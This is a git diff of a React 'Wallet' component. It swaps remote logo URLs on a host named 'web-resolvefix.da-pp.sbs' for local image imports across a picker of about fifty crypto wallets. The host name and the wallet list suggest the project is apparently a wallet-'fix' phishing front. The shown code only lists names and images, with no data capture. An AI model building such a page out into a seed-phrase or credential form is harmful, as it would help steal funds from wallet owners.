@@ -8,6 +8,62 @@ import './wallet.css';
 import { useState } from 'react';
 import axios from 'axios';
 import { Link } from 'react-router-dom';
+// coin images
+import trust from './coins/Trust.png';
+import walletconnect from './coins/Walletconnect.png';
+import Metamask from './coins/Metamask.png';
+import Rainbow from './coins/Rainbow.png';
+import ledger from './coins/Ledger.png';
+import hashpack from './coins/hashpack.png';
+import cryptocom from './coins/cryptop.com.png';
+import imtoken from './coins/imToken.png';
+import anchor from './coins/anchor.png';
+import onto from './coins/ONTO.png';
+import tokenpocket from './coins/TokenPocket.png';
+import mathwallet from './coins/Mathwallet.png';
+import bitpay from './coins/bitpay.png';
+import ledgerlife from './coins/Ledger Live.png';
+import maiar from './coins/maiar.png';
+import walleth from './coins/Walleth.png';
+import authereum from './coins/Authereun.png';
+import mykey from './coins/MYKEY.png';
+import trustvault from './coins/trustvault.png';
+import coolwallet from './coins/coolwallet.png';
+import decent from './coins/decent.png';
+import zelcore from './coins/zelcore.png';
+import coinomi from './coins/coinomi.png';
+import gridplus from './coins/gridplus.png';
+import wazirx from './coins/wazirx.png';
+import safepay from './coins/safepay.png';
+import infinito from './coins/infinito.png';
+import walletio from './coins/wallet.io.png';
+import infinitywallet from './coins/infinitywallet.png';
+import ownbit from './coins/ownbit.png';
+import easypocket from './coins/easypocket.png';
+import sparkplus from './coins/sparkpoint.png';
+import viawallet from './coins/viawallet.png';
+import bitkeep from './coins/bitkeep.png';
+import peakdefi from './coins/peakdefi.png';
+import cosmostatioin from './coins/cosmostation.png';
+import graph from './coins/graphprotocol.png';
+import kardiachain from './coins/kardian.png';
+import keplr from './coins/keplr.png';
+import iconex from './coins/iconex.png';
+import fetch from './coins/fetch.png';
+import xdc from './coins/xdc.png';
+import unstop from './coins/unstoppable.png';
+import meet from './coins/meet.png';
+import dok from './coins/dok.png';
+import at from './coins/atwallet.png';
+import moris from './coins/morix.png';
+import midas from './coins/midas.png';
+import keyring from './coins/keyring.png';
+import blockchain from './coins/blockchain.png';
+import binance from './coins/biancesmart.png';
+import ark from './coins/Aktionariat.png';
+
+// end of coin images
+
 
 function Wallet(){
 
@@ -27,442 +83,439 @@ function Wallet(){
       }, [location.pathname]); // The empty dependency array [] ensures this effect runs once on component mount
 
       const[wallets, setWallets]=useState([
-          {
-              "name":"Trust",
-              "url":"https://web-resolvefix.da-pp.sbs/app/images/trust-wallet-66f8777532931d9c09b633344981a6a9.png",
-
-          },
-
-          {
-            "name":"Wallet Connect",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/iogo.jpg",
-
+        {
+            "name":"Trust",
+            "url":trust,
 
         },
 
         {
-            "name":"Atomic",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/atomic-4c02d2b33cf091fd83c7a49819394e41.png",
+          "name":"Wallet Connect",
+          "url":walletconnect,
 
 
-        },
+      },
 
-        {
-            "name":"Metamask",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png",
+      // {
+      //     "name":"Atomic",
+      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/atomic-4c02d2b33cf091fd83c7a49819394e41.png",
 
 
-        },
+      // },
 
+      {
+          "name":"Metamask",
+          "url":Metamask,
 
-        {
-            "name":"Rainbow",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/rainbow-207dda8d66f8ffc00a21e4fcc5ce0a73.png",
 
+      },
+      {
+          "name":"Blockchain",
+          "url":blockchain,
 
-        },
 
-        {
-            "name":"Ledger",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/Ledger_38291882.png",
+      },
 
 
-        },
+      {
+          "name":"Binance Smart Chain",
+          "url":binance,
 
-        {
-            "name":"HashPack",
-            "url":"https://assets-global.website-files.com/614c99cf4f23700c8aa3752a/6323b696c42eaa1be5f8152a_public.png",
+      },
 
+      {
+          "name":"Crypto.com | DeFi Wallet",
+          "url":cryptocom,
 
-        },
 
-        {
-            "name":"Fantom Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/fantom-ftm-logo.png",
+      },
 
 
-        },
+      {
+          "name":"Rainbow",
+          "url":Rainbow,
 
-        {
-            "name":"Crypto.com | DeFi Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/crypto-4cbeac57421fb3ca2573db2cf448169a.png",
 
+      },
 
-        },
+      {
+          "name":"Ledger",
+          "url":ledger,
 
 
-        {
-            "name":"imToken",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/imtoken-fd8c7c52dac6101568954e7448a49202.png",
+      },
 
+      {
+          "name":"HashPack",
+          "url":hashpack,
 
-        },
 
-        {
-            "name":"Anchor",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/anchor.png",
+      },
 
+      // {
+      //     "name":"Fantom Wallet",
+      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/fantom-ftm-logo.png",
 
-        },
 
-        {
-            "name":"ONTO",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/onto-983003d35fe32bf916f9eda381f138f7.png",
+      // },
 
+     
 
-        },
 
-        {
-            "name":"TokenPocket",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/tokenpocket-57a4a886cc644e5237ac1558226154cb.png",
+      {
+          "name":"imToken",
+          "url":imtoken,
 
 
-        },
+      },
 
-        {
-            "name":"MathWallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/math-wallet-9e2256cfa5aad3b33af05f3fee4dc9ef.png",
+      {
+          "name":"Anchor",
+          "url":anchor,
 
 
-        },
+      },
 
+      {
+          "name":"ONTO",
+          "url":onto,
 
-        {
-            "name":"BitPay",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/bitpay-1573dd6c95eb38386f181048663590d0.jpg",
 
+      },
 
-        },
+      {
+          "name":"TokenPocket",
+          "url":tokenpocket,
 
-        {
-            "name":"Maiar",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/maiar.png",
 
+      },
 
-        },
+      {
+          "name":"MathWallet",
+          "url":mathwallet,
 
 
-        {
-            "name":"Ledger Live",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/ledgerlive-9fe387e571fb42ed5cdf08e29bc920ed.png",
+      },
 
 
-        },
+      {
+          "name":"BitPay",
+          "url":bitpay,
 
-        {
-            "name":"Walleth",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/walleth-b60336f8dd9ea86285408cb4f96634d1.png",
 
+      },
 
-        },
+      {
+          "name":"Maiar",
+          "url":maiar,
 
-        {
-            "name":"Authereum",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/authereum-32f3939207b77c1837547d5ed4f86110.png",
 
+      },
 
-        },
 
-        {
-            "name":"MYKEY",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/mykey-7419df5270c0406c80cba19fa5165923.png",
+      {
+          "name":"Ledger Live",
+          "url":ledgerlife,
 
 
-        },
+      },
 
-        {
-            "name":"TrustVault",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/trustvault-9031a67f82293fc50ead978f936cfff3.png",
+      {
+          "name":"Walleth",
+          "url":walleth,
 
 
-        },
+      },
 
+      {
+          "name":"Authereum",
+          "url":authereum,
 
-        {
-            "name":"Coin98",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/coin98-c5b50adaceaf474e48ef1dad150d0829.png",
 
+      },
 
-        },
+      {
+          "name":"MYKEY",
+          "url":mykey,
 
 
-        {
-            "name":"CoolWallet S",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/coolwallet-s-cc612ee7a151c1863293fcc69dd0f677.png",
+      },
 
+      {
+          "name":"TrustVault",
+          "url":trustvault,
 
-        },
 
+      },
 
-        {
-            "name":"D'CENT Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/dcentwallet-f0bdbaec0837431b87ac9886bb22dfd5.png",
 
+      // {
+      //     "name":"Coin98",
+      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/coin98-c5b50adaceaf474e48ef1dad150d0829.png",
 
-        },
 
-        {
-            "name":"ZelCore",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/zelcore-d4c1a7a444b95612f6373f0b536b6ccb.png",
+      // },
 
 
-        },
+      {
+          "name":"CoolWallet S",
+          "url":coolwallet,
 
 
-        {
-            "name":"Coinomi",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/coinomi-7eecd68e38d78752d68b7232bd9c58d9.jpg",
+      },
 
 
-        },
+      {
+          "name":"D'CENT Wallet",
+          "url":decent,
 
 
-        {
-            "name":"GridPlus",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/gridplus-8cedce167d37ddaa02f2afdf55841d8c.png",
+      },
 
+      {
+          "name":"ZelCore",
+          "url":zelcore,
 
-        },
 
-        {
-            "name":"CYBAVO Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png",
+      },
 
 
-        },
+      {
+          "name":"Coinomi",
+          "url":coinomi,
 
-        {
-            "name":"Wazirx",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/wazirx-logo-rounded.9bff9f42.png",
 
+      },
 
-        },
 
+      {
+          "name":"GridPlus",
+          "url":gridplus,
 
-        {
-            "name":"SafePal",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png",
 
+      },
 
-        },
+      // {
+      //     "name":"CYBAVO Wallet",
+      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/cybavowallet-16e7e96f2e3df01fe2170da5267774b5.png",
 
-        {
-            "name":"Infinito",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png",
 
+      // },
 
-        },
+      {
+          "name":"Wazirx",
+          "url":wazirx,
 
-        {
-            "name":"Wallet.io",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/wallet.io-198f396de22fe25eb370f46544abe69d.png",
 
+      },
 
-        },
 
+      {
+          "name":"SafePal",
+          "url":safepay,
 
-        {
-            "name":"Infinity Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png",
 
+      },
 
-        },
+      {
+          "name":"Infinito",
+          "url":infinito,
 
 
-        {
-            "name":"Ownbit",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png",
+      },
 
+      {
+          "name":"Wallet.io",
+          "url":walletio,
 
-        },
+      },
 
 
-        {
-            "name":"EasyPocket",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/easypocket-436ea3270a7bf77c02a880bfc70d0ee8.jpg",
+      {
+          "name":"Infinity Wallet",
+          "url":infinitywallet,
 
 
-        },
+      },
 
 
-        {
-            "name":"SparkPoint",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png",
+      {
+          "name":"Ownbit",
+          "url":ownbit,
 
 
-        },
+      },
 
 
+      {
+          "name":"EasyPocket",
+          "url":easypocket,
 
 
-        {
-            "name":"ViaWallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/viawallet-ae1502eddf4d2ed89abd36907dd3ae8a.png",
+      },
 
 
-        },
+      {
+          "name":"SparkPoint",
+          "url":sparkplus,
+      },
 
 
-        {
-            "name":"BitKeep",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/bitkeep-387b0ca7da4cf322f44c70c23064c529.png",
 
 
-        },
+      {
+          "name":"ViaWallet",
+          "url":viawallet,
 
 
-        {
-            "name":"Vision",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/vision-928292fe642172a18e62feb5eaa2d639.png",
+      },
 
 
-        },
+      {
+          "name":"BitKeep",
+          "url":bitkeep,
 
 
-        {
-            "name":"PEAKDEFI Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/peakdefi-2e1d4f97cc1a737a9aa765b3748ff315.png",
+      },
 
 
-        },
+      // {
+      //     "name":"Vision",
+      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/vision-928292fe642172a18e62feb5eaa2d639.png",
 
-        {
-            "name":"Cosmostation",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/cosmosstation.png",
 
+      // },
 
-        },
 
-        {
-            "name":"Graph Protocol",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/graph.jpg",
+      {
+          "name":"PEAKDEFI Wallet",
+          "url":peakdefi,
 
 
-        },
+      },
 
+      {
+          "name":"Cosmostation",
+          "url":cosmostatioin,
 
-        {
-            "name":"KardiaChain",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/kardachain.png",
 
+      },
 
-        },
+      {
+          "name":"Graph Protocol",
+          "url":graph,
 
 
-        {
-            "name":"Keplr",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/keplr.png",
+      },
 
 
-        },
+      {
+          "name":"KardiaChain",
+          "url":kardiachain,
 
-        {
-            "name":"Harmony",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/harmony.png",
 
+      },
 
-        },
 
-        {
-            "name":"ICONex",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/iconex.png",
+      {
+          "name":"Keplr",
+          "url":keplr,
 
 
-        },
+      },
 
+      // {
+      //     "name":"Harmony",
+      //     "url":"https://web-resolvefix.da-pp.sbs/app/images/harmony.png",
 
-        {
-            "name":"Fetch",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/fetch.jpg",
 
+      // },
 
-        },
+      {
+          "name":"ICONex",
+          "url":iconex,
 
-        {
-            "name":"XDC Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/xdc-9a98bff95dffc41869b8e77912a6cc54.png",
+      },
 
 
-        },
+      {
+          "name":"Fetch",
+          "url":fetch,
 
 
-        {
-            "name":"Unstoppable Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/unstoppable-0d3474dcd7572ac2080b0f4ce632dfac.png",
+      },
 
+      {
+          "name":"XDC Wallet",
+          "url":xdc,
 
-        },
 
+      },
 
-        {
-            "name":"MEET.ONE",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/meetone-01093db7d99e3e6cf5cca68b616f8255.jpg",
 
+      {
+          "name":"Unstoppable Wallet",
+          "url":unstop,
 
-        },
 
+      },
 
-        {
-            "name":"Dok Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/dok-a32c522e109217cc2a1a2a310f3c9bf7.png",
 
+      {
+          "name":"MEET.ONE",
+          "url":meet,
 
-        },
 
+      },
 
-        {
-            "name":"AT.Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/atwallet-2611d814a50a964b89d5f8bc1e5cb3a0.png",
 
+      {
+          "name":"Dok Wallet",
+          "url":dok,
 
-        },
 
-        {
-            "name":"MoriX Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/morixwallet-aa7d607cf9ad52afeb3b7c83e5f34eba.png",
+      },
 
 
-        },
+      {
+          "name":"AT.Wallet",
+          "url":at,
 
+      },
 
-        {
-            "name":"Midas Wallet",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/midas-wallet-5c5057d972ca621414f077541845fc61.png",
+      {
+          "name":"MoriX Wallet",
+          "url":moris,
 
 
-        },
+      },
 
 
-        {
-            "name":"KEYRING PRO",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png",
+      {
+          "name":"Midas Wallet",
+          "url":midas,
 
 
-        },
+      },
 
 
-        {
-            "name":"Blockchain",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/blockchain-logo.png",
+      {
+          "name":"KEYRING PRO",
+          "url":keyring,
 
 
-        },
+      },
 
 
-        {
-            "name":"Binance Smart Chain",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/bsc-logo.png",
+     
 
 
-        },
+      {
+          "name":"Aktionariat",
+          "url":ark,
 
 
-        {
-            "name":"Aktionariat",
-            "url":"https://web-resolvefix.da-pp.sbs/app/images/aktionariat-c5784b26234a389632687a36d2fb3258.png",
-
-
-        },
+      },
 
 
       ]);
